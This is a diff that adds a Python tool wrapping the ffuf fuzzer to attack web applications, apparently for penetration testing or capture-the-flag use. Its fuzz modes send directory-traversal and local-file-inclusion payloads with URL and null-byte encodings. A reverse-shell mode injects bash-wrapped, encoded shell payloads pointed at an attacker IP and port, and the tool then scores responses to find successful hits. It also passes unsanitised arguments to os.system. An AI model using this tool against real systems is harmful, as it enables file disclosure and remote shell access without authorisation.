@@ -1,0 +1,329 @@
+import argparse
+import json
+import numpy as np
+import os
+import shutil
+import string
+
+from glob import glob
+from multiprocessing import Pool, cpu_count
+from tqdm import tqdm
+
+from .data_classes import *
+from .util import find_common_substrings, parse_http_response
+from .revshells import get_revshells
+from .wordlists import wordlist_strip_prefix
+
+# TODO: Store data in .local
+# TODO: Known path should not start with slash and should end with one (if it is a dir)
+# TODO: Allow for multiple modes simultaneously
+# TODO: Figure out how to recommend PHP Inclusion (LFI), SSTI or XSS based on reflection analysis
+# TODO: Better support for Windows revshells? In general and in revshell_encoder
+
+# TODO: Command injection
+# TODO: PHP filters (php://filter/... and data://...)
+# TODO: SQL injection
+# TODO: Remote file inclusion? Test if we can establish a connection to a file hosted on a local webserver (run a simple web server). Or does this go in the PHP Inclusion, SSTI, and XSS category?
+
+def relpath_linux(args):
+    return [b"", b"../", b"../../", b"../../../", b"../../../../../../../../../../../../", b"/", b"~/"]
+
+def relpath_windows(args):
+    return [b"", b".\\", b"..\\", b"..\\..\\", b"..\\..\\..\\", b"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\", b"C:\\"]
+
+def relpath(args):
+    return relpath_linux(args) + relpath_windows(args)
+
+def url_encoder(w: str):
+    yield w
+    yield w + "%00"
+
+    if not w:
+        return
+
+    encode_dotdot = w.replace("..", "%2e%2e")
+    yield encode_dotdot
+    yield encode_dotdot + "%00"
+
+    encode_dotdot_and_slashes = encode_dotdot.replace("/", "%2f").replace("\\", "%5c")
+    yield encode_dotdot_and_slashes
+    yield encode_dotdot_and_slashes + "%00"
+
+def url_encoder_strict(w: str):
+    return "".join("%{0:0>2x}".format(ord(c)) if c not in (string.ascii_uppercase + string.ascii_lowercase + string.digits) else c for c in w)
+
+def revshell_encoder(w: str):
+    yield w
+    yield url_encoder_strict(w)
+
+    bash_wrap = f"bash -c \"{w.replace('"', '\\"')}\""
+    yield bash_wrap
+    yield url_encoder_strict(bash_wrap)
+
+FUZZ_TYPES = {
+    "lfi-general": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            relpath,
+            [wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt", [b"/", b"c:\\", b"C:\\", b"c:/", b"C:/"])]
+        ]),
+    ], encoders=[url_encoder], required_args=[]),
+
+    "lfi-general-linux": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            relpath_linux,
+            [wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt", [b"~/", b"/", b"~"])]
+        ]),
+    ], encoders=[url_encoder], required_args=[]),
+
+    "lfi-general-linux-extra": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            relpath_linux,
+            [wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt", [b"/"])]
+        ]),
+    ], encoders=[url_encoder], required_args=[]),
+
+    "lfi-general-windows": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            relpath_windows, [
+                wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt", [b"c:\\", b"C:\\", b"c:/", b"C:/"]),
+                wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt", [b"/", b"c:\\", b"C:\\", b"c:/", b"C:/"])
+            ]
+        ]),
+    ], encoders=[url_encoder], required_args=[]),
+
+    "lfi-known-path": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            relpath,
+            lambda args: [args.known_path.encode()]
+        ]),
+    ], encoders=[url_encoder], required_args=["known_path"]),
+    
+    "lfi-known-part-linux": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            relpath_linux,
+            lambda args: [args.known_path.encode()],
+            "/usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt"
+        ]),
+    ], encoders=[url_encoder], required_args=["known_path"]),
+
+    "revshell": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
+        ]),
+    ], encoders=[revshell_encoder], required_args=["attackbox_ip", "attackbox_port"]),
+}
+
+MAX_DISPLAY_RESULTS = 10
+
+def key_by(scan_results: list, key: str):
+    results = {}
+
+    for scan_result in scan_results:
+        k_val = getattr(scan_result, key)
+
+        if k_val not in results:
+            results[k_val] = set()
+        
+        results[k_val].add(scan_result)
+    
+    return results
+
+def compute_outliers(values, z_scores):
+    for start_z in range(100, 0, -1):
+        outliers = values[z_scores > start_z]
+
+        if len(outliers) > 0:
+            yield outliers.tolist(), start_z
+
+            for z in range(start_z - 1, 0, -1): # Yield 2 more
+                yield values[z_scores > z].tolist(), z
+
+            break
+
+def compute_analysis_groups(keyed_results: dict):
+    weighted_dict = {}
+    for key in keyed_results:
+        weighted_dict[key] = len(keyed_results[key])
+    
+    values = np.array(list(weighted_dict.keys()), dtype=float)
+    weights = np.array(list(weighted_dict.values()), dtype=float)
+
+    mean = np.average(values, weights=weights)
+    variance = np.average((values - mean)**2, weights=weights)
+
+    std = np.sqrt(variance)
+    if std == 0:
+        std = 0.000000000001
+
+    z_scores = np.abs(values - mean) / std
+
+    return compute_outliers(values, z_scores), mean, std
+
+def display_analysis_group(keyed_results: dict, total: int):
+    for k_val, results in sorted(keyed_results.items(), key=lambda s: s[0]):
+        results = list(sorted(results, key=lambda r: r.url))
+
+        print(f"{k_val} ({round(len(results) / total * 100, 2)}% of all results):")
+        for result in results[:MAX_DISPLAY_RESULTS]:
+            print(f"- {dict(result.payloads)}")
+        
+        if len(results) > MAX_DISPLAY_RESULTS:
+            print("- ...")
+        
+        print()
+
+
+def display_analysis(scan_results: list, key: str, key_name: str, outlier_based = False):
+    total = len(scan_results)
+    keyed_results = key_by(scan_results, key)
+    
+    if outlier_based:
+        outliers, mean, std = compute_analysis_groups(keyed_results)
+        print(f"\033[38;5;28m----- Results for {key_name} (mean={round(mean, 2)}, std={round(std, 2)}):\033[0m")
+
+        displayed_outliers = set()
+        for outliers, z in outliers:
+            keyed_results_outliers = {}
+            for key in keyed_results:
+                if key not in outliers or key in displayed_outliers:
+                    continue
+                
+                keyed_results_outliers[key] = keyed_results[key]
+                displayed_outliers.add(key)
+            
+            if len(keyed_results_outliers.keys()) == 0:
+                continue
+
+            print(f"\033[38;5;114m--- New outliers for z={z}:\033[0m")
+            display_analysis_group(keyed_results_outliers, total)
+        
+        return
+    
+    print(f"\033[38;5;28m----- Results for {key_name}:\033[0m")
+    display_analysis_group(keyed_results, total)
+
+def find_substrings(args):
+    scan_result, targets, min_len = args
+
+    _, response_body = parse_http_response(scan_result.response_raw)
+    substrings = find_common_substrings(targets, response_body, min_len)
+
+    return scan_result, substrings
+
+def display_response_analysis(scan_results: list, targets: set, min_len=8):
+    targets = set(filter(lambda t: len(t) >= min_len, targets))
+    matches = {}
+
+    pool_args = [(scan_result, targets, min_len) for scan_result in scan_results]
+    with Pool(cpu_count() // 2) as pool:
+        for scan_result, substrings in tqdm(pool.imap_unordered(find_substrings, pool_args), total=len(pool_args), desc="Analyzing reflection substrings..."):
+            for substring in substrings:
+                if scan_result not in matches:
+                    matches[scan_result] = set()
+                
+                matches[scan_result].add(substring)
+    
+    print(f"\033[38;5;28m----- Results for substring reflection:\033[0m")
+
+    # Sort by length of longest substring and then number of substrings secondary
+    sorted_results = sorted(matches.items(), key=lambda sr_subs: (max([len(s) for s in sr_subs[1]]), len(sr_subs[1])), reverse=True)
+    for i, (scan_result, substrings) in enumerate(sorted_results):
+        if i >= 50: # Cap at displaying 50 results
+            break
+        
+        print(f"\033[38;5;114m{dict(scan_result.payloads)} ({len(substrings)} substring matches):\033[0m")
+
+        results = list(sorted(substrings, key=lambda m: len(m), reverse=True))
+        for result in results[:MAX_DISPLAY_RESULTS]:
+            print(f"- {result}")
+        
+        if len(results) > MAX_DISPLAY_RESULTS:
+            print("- ...")
+    
+        print()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-p', '--proto', required=True, help="http or https")
+    parser.add_argument('-r', '--request', required=True, help="Request template file")
+    parser.add_argument('-t', '--type', required=True, choices=list(FUZZ_TYPES.keys()), help="Type of fuzz")
+    parser.add_argument('-th', '--threads', type=int, default=4, help="Number of threads to run FFUF with")
+
+
+    parser.add_argument('--attackbox-ip')
+    parser.add_argument('--attackbox-port', type=int)
+    parser.add_argument('--known-path')
+
+    args = parser.parse_args()
+
+    fuzz_type = FUZZ_TYPES[args.type]
+    for req_arg in fuzz_type.required_args:
+        if not getattr(args, req_arg):
+            print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{args.type}` fuzzing")
+            return
+
+
+    response_search_targets = set()
+    with open(args.request, "rb") as f: # Check that params are given in the request file
+        request_raw = f.read()
+
+        for param in fuzz_type.params:
+            assert param.name.encode() in request_raw
+
+        requestline_headers, request_body = request_raw, b""
+        if b"\r\n\r\n" in request_raw or b"\n\n" in request_raw:
+            requestline_headers, request_body = request_raw.split(b"\r\n\r\n") if b"\r\n\r\n" in request_raw else request_raw.split(b"\n\n")
+        
+        requestline, *headers = requestline_headers.split(b"\r\n") if b"\r\n" in requestline_headers else requestline_headers.split(b"\n")
+        
+        request_path = requestline.split(b" ")[1].decode()
+        request_headers = dict([h.decode().split(": ") for h in headers if b": " in h])
+        request_body = request_body.decode()
+
+        request_query = request_path.split("?")[1] if "?" in request_path else ""
+        request_params = dict([p.split("=") for p in request_query.split("&")])
+
+        response_search_targets = set(request_params.values()).union(set(request_headers.values()))
+        response_search_targets = set([t.encode() for t in response_search_targets])
+
+        if request_body:
+            response_search_targets.add(request_body)
+    
+    print(f"Will search for reflection of {response_search_targets} in response bodies. Make sure these inputs are as unique as possible!")
+    
+    data_dir = "./fuzzy-data"
+    shutil.rmtree(data_dir, ignore_errors=True)
+    os.makedirs(data_dir)
+
+    for i, fuzz_args in enumerate(fuzz_type.command_args(args)):
+        data_file = os.path.join(data_dir, f"ffuf-{i}.json")
+        os.system(f"ffuf -noninteractive -t {args.threads} -mc all -request-proto {args.proto} -request {args.request}{fuzz_args} -o {data_file} -of json -od {data_dir}/ > /dev/null")
+
+    scan_results = set()
+
+    data_files = glob(os.path.join(data_dir, "ffuf-*.json"))
+    for data_file in sorted(data_files):
+        with open(data_file, "rb") as f:
+            scan = json.load(f)
+
+            for result in scan["results"]:
+                payloads = result["input"]
+                del payloads["FFUFHASH"]
+
+                resultfile_path = os.path.join(data_dir, result["resultfile"])
+                with open(resultfile_path, "rb") as f:
+                    request_raw, response_raw = f.read().split(b"\n---- \xe2\x86\x91 Request ---- Response \xe2\x86\x93 ----\n\n")
+
+                scan_results.add(ScanResult(payloads=frozenset(payloads.items()), url=result["url"], status=result["status"], length=result["length"],
+                                                words=result["words"], lines=result["lines"], content_type=result["content-type"], duration=result["duration"],
+                                                response_raw=response_raw))
+    
+    display_analysis(scan_results, "status", "Status code")
+    display_analysis(scan_results, "length", "Content length", outlier_based=True)
+    display_analysis(scan_results, "words", "Content words", outlier_based=True)
+    display_analysis(scan_results, "lines", "Content lines", outlier_based=True)
+    display_analysis(scan_results, "duration", "Time to response (nanoseconds)", outlier_based=True)
+    display_response_analysis(scan_results, response_search_targets)
+
+if __name__ == "__main__":
+    main()
